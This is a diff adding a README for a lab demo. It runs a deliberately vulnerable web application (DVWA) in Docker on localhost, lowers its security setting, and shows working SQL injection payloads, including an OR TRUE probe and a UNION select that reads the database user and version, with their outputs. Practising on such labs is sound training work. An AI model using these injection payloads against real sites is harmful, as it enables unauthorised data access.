@@ -1,0 +1,75 @@
+# demo-python-three
+
+## description
+search a 'remote' target hosting a **'damn vulnerable web application'** instance for an sql injection vulnerability
+
+## installation / setup
+```
+> docker search dvwa
+> docker pull citizenstig/dvwa
+> docker images
+> docker run -d -p 80:80 citizenstig/dvwa
+```
+yields a 'target host' at `http://localhost:80/`
+
+optionally use..
+```
+> docker ps -a
+> docker exec -it 8a021ce97f45 /bin/bash
+> cd /var/www/html/
+```
+..for a rummage around the service's files
+
+the compromise is only possible for a lowered security version of the site, configurable by insecure `security` cookie override `impossible` -> `low` post login
+
+```
+> waterfox 127.0.0.1/login.php
+username: 'admin' / password: 'password'
+> waterfox 127.0.0.1/vulnerabilities/sqli/index.php
+S-f2 (mozilla developer bar) -> cookie set security low
+```
+
+## sql injection exploitation
+confirmation of the vulnerability can be observed via the multiple return records visible following POST of the following `id`:
+```
+"-1 OR TRUE #"
+```
+returning:
+```
+ID: -1' OR TRUE #
+First name: admin
+Surname: admin
+
+ID: -1' OR TRUE #
+First name: Gordon
+Surname: Brown
+
+ID: -1' OR TRUE #
+First name: Hack
+Surname: Me
+
+ID: -1' OR TRUE #
+First name: Pablo
+Surname: Picasso
+
+ID: -1' OR TRUE #
+First name: Bob
+Surname: Smith
+```
+
+php's `mysql_query` filters multiple statements by default to make sql injection harder / less destructive ..but alas, composite select statements are still single statements, so via use of sql UNIONs arbitrary selects can be made ..although in this instance not easily recovered given the shape of the hard coded field selection criteria, limiting us to **'\*x2'** output dimensions
+
+extracting the database version and user can be achieve by:
+```
+"-1' union select user(), @@version #"
+```
+yielding
+```
+ID: -1' union select user(), @@version #
+First name: admin@localhost
+Surname: 5.5.47-0ubuntu0.14.04.1
+```
+
+## dependencies
+- docker
+- dvwa
